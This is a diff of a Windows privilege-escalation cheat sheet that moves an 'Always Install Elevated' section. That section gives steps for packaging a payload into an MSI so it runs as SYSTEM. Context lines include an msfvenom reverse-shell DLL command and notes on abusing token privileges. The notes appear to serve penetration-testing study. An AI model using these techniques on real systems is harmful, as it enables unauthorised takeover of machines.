@@ -11,6 +11,7 @@
     * [Weak registry permissions](#Weak-registry-permissions)
     * [Insecure Service Executables](#Insecure-Service-Executables)
     * [DLL Hijacking](#DLL-Hijacking)
+    * [Always Install Elevated](#Always-Install-Elevated)
   * [Registery](#Registery)
   * [Passwords](#Passwords)
   * [Scheduled tasks](#Scheduled-tasks)
@@ -399,6 +400,22 @@ msfvenom -p windows/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f dll -o <NAM
 net stop <SERVICE>
 net start <SERVICE>
 ```
+ 
+ ### Always Install Elevated
+ - This policy allows standard users to install applications that require access to directories and registry keys that they may not usually have permission to change. This is equivalent to granting full administrative rights and even though Microsoft strongly discourages its use, it can still be found.
+
+- To exploit this, we need to package a payload into an MSI installer that will be installed and executed with SYSTEM privileges.
+  - Generate a new Windows EXE TCP payload and save it to C:\Payloads\beacon-tcp.exe.
+  - Open Visual Studio, select Create a new project and type "installer" into the search box. Select the Setup Wizard project and click Next.
+  - Give the project a name, like BeaconInstaller, use C:\Payloads for the location, select place solution and project in the same directory, and click Create.
+  - Keep clicking Next until you get to step 3 of 4 (choose files to include). Click Add and select the Beacon payload you just generated. Then click Finish.
+  - Highlight the BeaconInstaller project in the Solution Explorer and in the Properties, change TargetPlatform from x86 to x64. 
+  - Right-click the project and select View > Custom Actions.
+  - Right-click Install and select Add Custom Action.
+  - Double-click on Application Folder, select your beacon-tcp.exe file and click OK. This will ensure that the beacon payload is executed as soon as the installer is run.
+  - Under the Custom Action Properties, change Run64Bit to True.
+  - Now build the project, which should produce an MSI at ```C:\Payloads\BeaconInstaller\Debug\BeaconInstaller.msi```.
+  - To remove the MSI afterwards, you can use ```msiexec /q /n /uninstall BeaconInstaller.msi``` before removing the file.
 
 ## Registery
 ### Autoruns
@@ -665,22 +682,6 @@ whoami /priv
   - The SeRestorePrivilege grants write access to all objects on the system, regardless of their ACL. There are a multitude of ways to abuse this privilege: Modify service binaries, Overwrite DLLS used by SYSTEM processes, Modify registery settings
 - SeTakeOwnershipPrivilege
   - The SeTakeOwnershipPrivilege lets the user take ownership over an object (the WRITE_OWNER permission). Once you own an object, you can modify its ACL and grant yourself write access. The same methods used with SeRestorePrivilege then apply.
- 
- ### Always Install Elevated
- - This policy allows standard users to install applications that require access to directories and registry keys that they may not usually have permission to change. This is equivalent to granting full administrative rights and even though Microsoft strongly discourages its use, it can still be found.
-
-- To exploit this, we need to package a payload into an MSI installer that will be installed and executed with SYSTEM privileges.
-  - Generate a new Windows EXE TCP payload and save it to C:\Payloads\beacon-tcp.exe.
-  - Open Visual Studio, select Create a new project and type "installer" into the search box. Select the Setup Wizard project and click Next.
-  - Give the project a name, like BeaconInstaller, use C:\Payloads for the location, select place solution and project in the same directory, and click Create.
-  - Keep clicking Next until you get to step 3 of 4 (choose files to include). Click Add and select the Beacon payload you just generated. Then click Finish.
-  - Highlight the BeaconInstaller project in the Solution Explorer and in the Properties, change TargetPlatform from x86 to x64. 
-  - Right-click the project and select View > Custom Actions.
-  - Right-click Install and select Add Custom Action.
-  - Double-click on Application Folder, select your beacon-tcp.exe file and click OK. This will ensure that the beacon payload is executed as soon as the installer is run.
-  - Under the Custom Action Properties, change Run64Bit to True.
-  - Now build the project, which should produce an MSI at ```C:\Payloads\BeaconInstaller\Debug\BeaconInstaller.msi```.
-  - To remove the MSI afterwards, you can use ```msiexec /q /n /uninstall BeaconInstaller.msi``` before removing the file.
 
 ## UAC bypass
 - A UAC bypass is a technique by which an application can go from Medium to High Integrity without prompting for consent.
